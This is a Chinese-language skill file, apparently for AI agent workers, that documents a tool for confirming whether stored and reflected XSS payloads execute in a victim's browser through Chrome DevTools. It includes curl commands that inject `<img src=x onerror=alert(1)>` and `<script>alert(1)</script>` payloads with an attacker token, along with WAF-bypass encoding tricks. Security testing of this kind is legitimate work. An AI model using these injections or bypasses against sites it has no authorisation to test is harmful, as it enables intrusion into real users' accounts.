---
name: xss-verify
description: 验证存储型/反射型 XSS 是否真实在受害者浏览器中执行。自动创建隔离 tab，导航到受害者视角页面，监听 alert dialog 事件确认 XSS 真实触发，检测完自动关闭 tab。多 worker 同时使用互不干扰。
---

## 多 Worker 隔离

工具默认**每次创建新 tab**，检测完自动关闭。多个 worker 同时运行 XSS 验证互不干扰。

不要手动指定 `--tab-index`（会复用已有 tab，与其他 worker 冲突），除非你确定没有其他 worker 在使用 Chrome-SecTest。

---

## 工具路径

```
tools/xss-verify/detect.py    ← 主工具（CDP dialog 检测器）
tools/xss-verify/launch.sh    ← 启动 Chrome-SecTest（幂等，重复调用安全）
```

依赖：`python3 + websocket-client`（已安装）

---

## 操作步骤

### Step 1：确保 Chrome-SecTest 已运行

```bash
bash tools/xss-verify/launch.sh
```

launch.sh 是幂等的——如果 Chrome-SecTest 已在运行，直接返回。多 worker 可以安全地各自调用。

验证是否就绪：
```bash
curl -s http://localhost:9223/json/list | python3 -c "import json,sys; print(f'Chrome-SecTest: {len(json.load(sys.stdin))} tab(s)')" 2>/dev/null || echo "Chrome-SecTest 未运行"
```

### Step 2：运行检测工具

```bash
python3 tools/xss-verify/detect.py \
  "https://target.example.com/victim-page" \
  --timeout 8 \
  --cdp-port 9223
```

工具会自动：
1. 在 Chrome-SecTest 中创建新 tab
2. 导航到受害者页面 URL
3. 等待 alert dialog（默认 8 秒）
4. 关闭 tab（无论是否触发）

### Step 3：判定结果

| 退出码 | 含义 |
|--------|------|
| `0` | dialog 触发，`dialog_message` 已输出到 stdout，核对是否与注入的 payload 匹配 |
| `1` | 未触发 dialog（检查页面 URL 是否正确、受害者视角是否能看到该字段） |
| `2` | 错误（Chrome 未运行、CDP 连接失败等） |

stdout 输出格式：`dialog_message='1'`（dialog 的原始消息内容）
stderr 输出：过程日志（创建 tab、导航、关闭 tab）

---

## 证据模板

```
【注入】PATCH /api/v1/xxx (attacker JWT) body={"field":"<img src=x onerror=alert(1)>"} → HTTP 200
【检测命令】python3 tools/xss-verify/detect.py "https://target/victim-page" --cdp-port 9223
【检测结果】exit 0 — dialog_message='1' ← 与注入的 alert(1) 匹配，XSS 真实执行确认
```

---

## 完整 XSS 验证流程

### 存储型 XSS

1. **注入 payload**：用攻击者账号通过 API 写入恶意内容
   ```bash
   curl -X PUT "https://target/api/profile" -H "Authorization: Bearer <attacker_token>" -d '{"name":"<img src=x onerror=alert(1)>"}'
   ```

2. **确认存储**：读取受害者视角，验证 payload 未被转义
   ```bash
   curl "https://target/api/profile" -H "Authorization: Bearer <victim_token>"
   # 确认返回的 name 字段含未转义的 <img src=x onerror=alert(1)>
   ```

3. **验证执行**：导航到受害者页面，检测 dialog
   ```bash
   python3 tools/xss-verify/detect.py "https://target/profile" --cdp-port 9223 --timeout 10
   ```

4. **判定**：exit 0 + dialog_message 与 payload 匹配 → XSS 确认

### 反射型 XSS

1. **构造 URL**：`https://target/search?q=<script>alert(1)</script>`
2. **验证执行**：
   ```bash
   python3 tools/xss-verify/detect.py "https://target/search?q=<script>alert(1)</script>" --cdp-port 9223
   ```

---

## 常见问题

| 问题 | 解决 |
|------|------|
| dialog 未弹出 | 确认是前端页面 URL，不是 API endpoint；确认受害者视角能看到含 payload 的字段；增加 `--timeout 15` |
| Chrome 未运行 | `bash tools/xss-verify/launch.sh` 启动 |
| `--tab-index` 冲突 | 不要用 `--tab-index`，默认创建新 tab 即可 |
| 创建 tab 失败 | Chrome 可能 tab 数量过多，关闭一些不需要的 tab |
| payload 被 WAF 拦截 | 尝试编码绕过：`\u003cscript\u003e`、`<scr<script>ipt>` 等 |
